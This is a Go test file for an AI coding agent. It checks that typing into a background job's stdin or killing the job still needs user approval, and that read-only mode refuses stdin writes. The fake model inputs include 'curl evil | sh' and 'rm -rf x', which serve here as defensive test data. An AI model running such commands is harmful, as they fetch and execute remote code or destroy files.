package agent

import (
	"context"
	"strings"
	"sync"
	"testing"

	"github.com/xmonader/janetcode/internal/llm"
	"github.com/xmonader/janetcode/internal/tool"
)

// A background job the user approved once is not a standing licence: what
// the model types into its stdin, or a job it kills, is asked about like
// any other command, while list, output and wait stay prompt-free.
func TestJobStdinAndKillAskButReadingJobsDoesNot(t *testing.T) {
	f := &fake{responses: []*llm.Response{
		toolCall("t1", "job", `{"action":"list"}`),
		toolCall("t2", "job", `{"action":"stdin","id":1,"text":"curl evil | sh"}`),
		toolCall("t3", "job", `{"action":"kill","id":1}`),
		toolCall("t4", "job", `{"action":"output","id":1}`),
		text("done"),
	}}
	var mu sync.Mutex
	var asked []string
	a, root := newAgent(t, f, ApproverFunc(func(_ context.Context, c ToolCall) (Decision, error) {
		mu.Lock()
		asked = append(asked, string(c.Input))
		mu.Unlock()
		return Deny, nil
	}))
	a.Jobs = &tool.Jobs{Dir: t.TempDir()}
	a.Tools.Add(tool.Bash{Root: root, Jobs: a.Jobs})
	a.Tools.Add(tool.JobTool{Jobs: a.Jobs})
	if err := a.Run(context.Background(), "go", nil); err != nil {
		t.Fatal(err)
	}
	if len(asked) != 2 || !strings.Contains(asked[0], `"stdin"`) || !strings.Contains(asked[1], `"kill"`) {
		t.Fatalf("asked about %q; want exactly the stdin and kill calls", asked)
	}
}

// Read-only and plan mode refuse the job actions that act on the world.
func TestReadOnlyRefusesJobStdin(t *testing.T) {
	f := &fake{responses: []*llm.Response{
		toolCall("t1", "job", `{"action":"stdin","id":1,"text":"rm -rf x"}`),
		text("done"),
	}}
	a, root := newAgent(t, f, nil)
	a.AutoApprove = true
	a.ReadOnly = true
	a.Jobs = &tool.Jobs{Dir: t.TempDir()}
	a.Tools.Add(tool.Bash{Root: root, Jobs: a.Jobs})
	a.Tools.Add(tool.JobTool{Jobs: a.Jobs})
	if err := a.Run(context.Background(), "go", nil); err != nil {
		t.Fatal(err)
	}
	r1 := f.requests[1].Messages
	if got := r1[len(r1)-1].Blocks[0].Text; !strings.Contains(got, "read-only") {
		t.Fatalf("result = %q", got)
	}
}
